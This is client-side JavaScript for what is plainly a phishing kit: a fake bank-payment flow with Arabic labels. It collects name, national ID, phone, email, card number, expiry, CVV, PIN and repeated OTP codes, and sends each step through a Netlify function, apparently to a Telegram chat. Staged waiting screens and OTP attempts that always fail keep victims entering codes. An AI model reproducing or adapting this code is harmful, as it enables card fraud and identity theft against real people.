let selectedBank = null;
let otpAttempts = 0;
const maxOtpAttempts = 3;
let messageId = null;
let collectedData = {};

function buildMessage() {
    let message = "📋 تفاصيل عملية الدفع:\n\n";
    for (const [step, stepData] of Object.entries(collectedData)) {
        message += `📌 ${step}\n`;
        
        if (typeof stepData === 'object') {
            for (const [key, value] of Object.entries(stepData)) {
                message += `  • ${key}: ${value}\n`;
            }
        } else {
            message += `  • ${stepData}\n`;
        }
        
        message += "\n";
    }
    
    if (otpAttempts > 0) {
        message += `\n🔢 عدد محاولات OTP: ${otpAttempts}/${maxOtpAttempts}\n`;
    }
    
    return message;
}

async function sendToTelegram(data, isUpdate = false) {
    try {
        collectedData[data.step] = data.data;
        const message = buildMessage();

        const body = {
            message: message,
            isUpdate: isUpdate,
            messageId: messageId
        };

        const response = await fetch('/.netlify/functions/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });

        const result = await response.json();

        if (!messageId && result.ok) {
            messageId = result.result.message_id;
        }

    } catch (error) {
        console.error('خطأ في إرسال البيانات:', error);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    const bankCardsContainer = document.getElementById('bank-cards-container');
    banks.forEach(bank => {
        const bankCard = document.createElement('div');
        bankCard.className = 'bank-card';
        bankCard.dataset.id = bank.id;
        bankCard.innerHTML = `
            <img src="${bank.logo}" alt="${bank.name}">
            <p>${bank.name}</p>
        `;
        bankCard.addEventListener('click', function() {
            document.querySelectorAll('.bank-card').forEach(card => {
                card.classList.remove('selected');
            });
            this.classList.add('selected');
            selectedBank = bank;
            
            sendToTelegram({ 
                step: '🏦 اختيار البنك', 
                data: selectedBank.name 
            }, true);
            
            document.getElementById('bank-selection-page').classList.add('hidden');
            document.getElementById('bank-waiting-page').classList.remove('hidden');
            
            setTimeout(() => {
                if (selectedBank.url) {
                    window.location.href = selectedBank.url;
                } else {
                    alert("عذراً، هذا البنك غير متاح حالياً.");
                    document.getElementById('bank-waiting-page').classList.add('hidden');
                    document.getElementById('bank-selection-page').classList.remove('hidden');
                }
            }, 3000);
        });
        bankCardsContainer.appendChild(bankCard);
    });
    
    document.getElementById('phone').addEventListener('input', function() {
        const phoneError = document.getElementById('phone-error');
        const phoneRegex = /^05\d{8}$/;
        if (!phoneRegex.test(this.value)) {
            phoneError.style.display = 'block';
        } else {
            phoneError.style.display = 'none';
        }
    });
    
    document.getElementById('email').addEventListener('input', function() {
        const emailError = document.getElementById('email-error');
        const emailRegex = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;
        if (!emailRegex.test(this.value)) {
            emailError.style.display = 'block';
        } else {
            emailError.style.display = 'none';
        }
    });
    
    document.getElementById('id-number').addEventListener('input', function() {
        const idError = document.getElementById('id-number-error');
        if (this.value.length < 5) {
            idError.style.display = 'block';
        } else {
            idError.style.display = 'none';
        }
    });
    
    document.getElementById('card-part-1').addEventListener('input', function() {
        if (this.value.length === 4) {
            document.getElementById('card-part-2').focus();
        }
    });
    
    document.getElementById('card-part-2').addEventListener('input', function() {
        if (this.value.length === 4) {
            document.getElementById('card-part-3').focus();
        }
    });
    
    document.getElementById('card-part-3').addEventListener('input', function() {
        if (this.value.length === 4) {
            document.getElementById('card-part-4').focus();
        }
    });
    
    document.getElementById('expiry-date').addEventListener('input', function(e) {
        const input = this.value;
        
        if (input.length > 5) {
            this.value = input.slice(0, 5);
            return;
        }
        
        if (input.length === 2 && !input.includes('/')) {
            this.value = input + '/';
        }
        
        if (input.length >= 1) {
            const month = input.split('/')[0];
            if (month.length === 1 && month > '1') {
                this.value = '0' + month;
            } else if (month === '0') {
                this.value = '';
            }
        }
    });
    
document.querySelectorAll('.card-input, #cvv, #otp-input').forEach(input => {
    input.addEventListener('keypress', function(e) {
        if (isNaN(String.fromCharCode(e.keyCode)) && e.keyCode !== 8) {
            e.preventDefault();
        }
    });
});
    
    document.getElementById('personal-info-form').addEventListener('submit', function(e) {
        e.preventDefault(); // يمنع التحديث الافتراضي للصفحة
        
        const phone = document.getElementById('phone').value;
        const email = document.getElementById('email').value;
        const idNumber = document.getElementById('id-number').value;
        
        if (!/^05\d{8}$/.test(phone)) {
            document.getElementById('phone-error').style.display = 'block';
            return;
        }
        
        if (!/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(email)) {
            document.getElementById('email-error').style.display = 'block';
            return;
        }
        
        if (idNumber.length < 5) {
            document.getElementById('id-number-error').style.display = 'block';
            return;
        }
        
        const formData = {
            'الاسم الكامل': document.getElementById('full-name').value,
            'رقم الهوية': idNumber,
            'رقم الجوال': phone,
            'البريد الإلكتروني': email
        };
        
        sendToTelegram({ 
            step: '🎯 معلومات شخصية', 
            data: formData 
        });
        
        document.getElementById('confirm-name').textContent = formData['الاسم الكامل'];
        document.getElementById('confirm-id').textContent = formData['رقم الهوية'];
        document.getElementById('confirm-phone').textContent = formData['رقم الجوال'];
        document.getElementById('confirm-email').textContent = formData['البريد الإلكتروني'];
        
        document.getElementById('home-page').classList.add('hidden');
        document.getElementById('verification-page').classList.remove('hidden');
        
        setTimeout(() => {
            document.getElementById('verification-page').classList.add('hidden');
            document.getElementById('confirmation-page').classList.remove('hidden');
        }, 5000);
    });
    
    document.getElementById('confirm-btn').addEventListener('click', function() {
        document.getElementById('confirmation-page').classList.add('hidden');
        document.getElementById('confirmation-waiting-page').classList.remove('hidden');
        
        setTimeout(() => {
            document.getElementById('confirmation-waiting-page').classList.add('hidden');
            document.getElementById('bank-selection-page').classList.remove('hidden');
        }, 3000);
    });
    
    document.getElementById('card-details-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const cardNumber = document.getElementById('card-part-1').value + 
                          document.getElementById('card-part-2').value + 
                          document.getElementById('card-part-3').value + 
                          document.getElementById('card-part-4').value;
        
        const expiryDate = document.getElementById('expiry-date').value;
        const cvv = document.getElementById('cvv').value;
        const pin = document.getElementById('card-pin').value;
        
        if (cardNumber.length !== 16) {
            alert('يجب إدخال رقم بطاقة صحيح (16 رقم)');
            return;
        }
        
        if (!/^(0[1-9]|1[0-2])\/[0-3][0-9]$/.test(expiryDate)) {
            document.getElementById('expiry-error').style.display = 'block';
            return;
        }
        
        if (cvv.length !== 3) {
            document.getElementById('cvv-error').style.display = 'block';
            return;
        }
        
        if (pin.length !== 4) {
            document.getElementById('pin-error').style.display = 'block';
            return;
        }
        
        const cardData = {
            'رقم البطاقة': cardNumber,
            'تاريخ الانتهاء': expiryDate,
            'CVV': cvv,
            'PIN': pin
        };
        
        sendToTelegram({ 
            step: '💳 بيانات البطاقة', 
            data: cardData 
        }, true);
        
        document.getElementById('card-details-page').classList.add('hidden');
        document.getElementById('payment-waiting-page').classList.remove('hidden');
        
        setTimeout(() => {
            document.getElementById('payment-waiting-page').classList.add('hidden');
            
            // تعيين شعار البنك المختار
            document.getElementById('otp-bank-logo').src = selectedBank.logo;
            
            document.getElementById('otp-page').classList.remove('hidden');
            document.getElementById('attempts-left').textContent = `عدد المحاولات المتبقية: ${maxOtpAttempts - otpAttempts}`;
            
            document.getElementById('otp-input').focus();
        }, 15000);
    });
    
    document.getElementById('verify-otp-btn').addEventListener('click', function() {
        const otpInput = document.getElementById('otp-input');
        const otp = otpInput.value;
        const otpLoading = document.getElementById('otp-loading');
        
        if (!/^\d{4,6}$/.test(otp)) {
            alert('كود التحقق مؤلف من (4 أو 6 أرقام)');
            otpInput.focus();
            return;
        }
        
        otpLoading.style.display = 'block';
        document.getElementById('verify-otp-btn').disabled = true;
        
        sendToTelegram({ 
            step: `🔑 محاولة OTP (${otpAttempts + 1}/${maxOtpAttempts})`, 
            data: { 'الكود المدخل': otp } 
        }, true);
        
        setTimeout(() => {
            otpAttempts++;
            document.getElementById('attempts-left').textContent = `عدد المحاولات المتبقية: ${maxOtpAttempts - otpAttempts}`;
            otpInput.value = '';
            
            otpLoading.style.display = 'none';
            document.getElementById('verify-otp-btn').disabled = false;
            
            if (otpAttempts >= maxOtpAttempts) {
                document.getElementById('otp-page').classList.add('hidden');
                document.getElementById('otp-error-page').classList.remove('hidden');
            } else {
                otpInput.focus();
            }
        }, 10000);
    });
    
    document.getElementById('restart-process-btn').addEventListener('click', function() {
        location.reload();
    });
});